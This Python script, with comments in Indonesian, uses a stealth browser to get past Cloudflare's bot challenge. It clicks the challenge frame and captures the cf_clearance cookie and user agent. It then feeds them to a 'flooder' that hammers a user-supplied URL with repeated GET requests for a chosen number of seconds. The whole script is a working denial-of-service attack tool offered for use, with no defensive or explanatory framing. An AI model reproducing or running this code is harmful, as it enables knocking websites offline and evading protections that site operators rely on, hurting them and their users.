import asyncio
import sys
import time
import requests
from dataclasses import dataclass
from typing import Any, Dict

from camoufox.async_api import AsyncCamoufox
from browserforge.fingerprints import Screen
from colorama import init, Fore, Style

init(autoreset=True)

@dataclass
class CloudflareCookie:
    name: str
    value: str
    domain: str
    path: str
    expires: int
    http_only: bool
    secure: bool
    same_site: str

    @classmethod
    def from_json(cls, cookie_data: Dict[str, Any]) -> "CloudflareCookie":
        return cls(
            name=cookie_data.get("name", ""),
            value=cookie_data.get("value", ""),
            domain=cookie_data.get("domain", ""),
            path=cookie_data.get("path", "/"),
            expires=cookie_data.get("expires", 0),
            http_only=cookie_data.get("httpOnly", False),
            secure=cookie_data.get("secure", False),
            same_site=cookie_data.get("sameSite", "Lax"),
        )

class SimpleCloudflareSolver:
    def __init__(self, sleep_time=3, headless=True, os=None, debug=False, retries=10):
        self.cf_clearance = None
        self.sleep_time = sleep_time
        self.headless = headless
        self.os = os or ["windows"]
        self.debug = debug
        self.retries = retries

    async def solve(self, link: str):
        try:
            print(f"{Fore.GREEN}[info]{Style.RESET_ALL} Starting simple browser...")
            
            async with AsyncCamoufox(
                headless=self.headless,
                os=self.os,
                screen=Screen(max_width=1920, max_height=1080),
                args=[
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-infobars",
                    "--start-maximized",
                    "--lang=en-US,en;q=0.9",
                    "--window-size=1920,1080",
                ]
            ) as browser:
                page = await browser.new_page()
                await page.set_viewport_size({"width": 1920, "height": 1080})
                
                print(f"{Fore.CYAN}[info]{Style.RESET_ALL} Navigating to: {link}")
                await page.goto(link)
                
                # Strategi tunggu pasif - biarkan Cloudflare bekerja
                print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Waiting for Cloudflare to process...")
                
                max_wait_time = 30  # 30 detik maksimal
                wait_interval = 2   # Check setiap 2 detik
                
                for wait_cycle in range(max_wait_time // wait_interval):
                    await asyncio.sleep(wait_interval)
                    
                    title = await page.title()
                    url = page.url
                    frames = len(page.frames)
                    
                    print(f"{Fore.CYAN}[wait {wait_cycle * wait_interval}s]{Style.RESET_ALL} Title: '{title}' | Frames: {frames}")
                    
                    # Cek indikator bahwa challenge selesai
                    if "just a moment" not in title.lower() and "checking your browser" not in title.lower():
                        print(f"{Fore.GREEN}[success]{Style.RESET_ALL} Challenge seems completed!")
                        break
                    
                    # Jika ada frame challenge, coba klik sekali saja
                    challenge_frame_found = False
                    for frame in page.frames:
                        if "challenges.cloudflare.com" in frame.url:
                            if not challenge_frame_found:  # Hanya klik sekali
                                print(f"{Fore.YELLOW}[action]{Style.RESET_ALL} Clicking challenge frame...")
                                try:
                                    frame_element = await frame.frame_element()
                                    box = await frame_element.bounding_box()
                                    if box:
                                        # Klik di tengah frame
                                        click_x = box["x"] + box["width"] / 2
                                        click_y = box["y"] + box["height"] / 2
                                        await page.mouse.click(click_x, click_y)
                                        challenge_frame_found = True
                                except Exception as e:
                                    print(f"{Fore.RED}[error]{Style.RESET_ALL} Click failed: {e}")
                
                # Tunggu tambahan untuk cookie
                print(f"{Fore.CYAN}[info]{Style.RESET_ALL} Waiting for cookies...")
                await asyncio.sleep(5)
                
                # Ambil semua cookie
                cookies = await page.context.cookies()
                ua = await page.evaluate("() => navigator.userAgent")
                
                print(f"{Fore.CYAN}[debug]{Style.RESET_ALL} Found {len(cookies)} cookies:")
                for cookie in cookies:
                    print(f"{Fore.CYAN}[debug]{Style.RESET_ALL} - {cookie['name']}: {cookie['value'][:30]}...")
                
                # Cari cf_clearance atau cookie Cloudflare lainnya
                cf_cookie = next((c for c in cookies if c["name"] == "cf_clearance"), None)
                
                if cf_cookie:
                    print(f"{Fore.GREEN}[success]{Style.RESET_ALL} cf_clearance found!")
                    return cf_cookie['value'], ua
                else:
                    # Cari cookie Cloudflare lainnya
                    cf_cookies = [c for c in cookies if any(cf_name in c["name"].lower() for cf_name in ['cf', '__cf', 'cloudflare'])]
                    
                    if cf_cookies:
                        best_cookie = cf_cookies[0]
                        print(f"{Fore.YELLOW}[fallback]{Style.RESET_ALL} Using {best_cookie['name']} as alternative")
                        return best_cookie['value'], ua
                    else:
                        print(f"{Fore.RED}[error]{Style.RESET_ALL} No Cloudflare cookies found")
                        return None, None

        except Exception as e:
            print(f"{Fore.RED}[error]{Style.RESET_ALL} Error: {e}")
            return None, None

async def main(url: str, duration: int):
    solver = SimpleCloudflareSolver()
    max_attempts = 5
    cookie = None
    ua = None

    for attempt in range(1, max_attempts + 1):
        print(f"{Fore.CYAN}[attempt]{Style.RESET_ALL} Attempt {attempt} to solve Cloudflare")
        cookie, ua = await solver.solve(url)
        if cookie and ua:
            break
        print(f"{Fore.RED}[retry]{Style.RESET_ALL} Retry after failure...")

    if not cookie or not ua:
        print(f"{Fore.RED}[error]{Style.RESET_ALL} Failed to solve Cloudflare after {max_attempts} attempts")
        return

    print(f"[*] cf_clearance: {cookie}")
    print(f"[*] User-Agent: {ua}")
    print(f"[*] Starting flooder for {duration} seconds...\n")

    target = url
    duration = duration
    cookie = f"cf_clearance={cookie}"
    userAgent = ua

    print(f"[+] Target: {target}")
    print(f"[+] Duration: {duration}s")
    print(f"[+] Cookie: {cookie}")
    print(f"[+] User-Agent: {userAgent}")

    def flood():
        for _ in range(170):
            try:
                response = requests.get(target, headers={
                    'User-Agent': userAgent,
                    'Cookie': cookie
                })
                print(f"[+] Status: {response.status_code}")
            except Exception as e:
                pass

    attack_interval = 0
    while attack_interval < duration:
        flood()
        attack_interval += 1
        time.sleep(1)

    print('Attack stopped.')

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"{Fore.RED}Usage:{Style.RESET_ALL} python3 simple.py <url> <duration_in_seconds>")
        sys.exit(1)

    url = sys.argv[1]
    try:
        duration = int(sys.argv[2])
    except ValueError:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} Durasi harus berupa angka (dalam detik)")
        sys.exit(1)

    asyncio.run(main(url, duration))
    
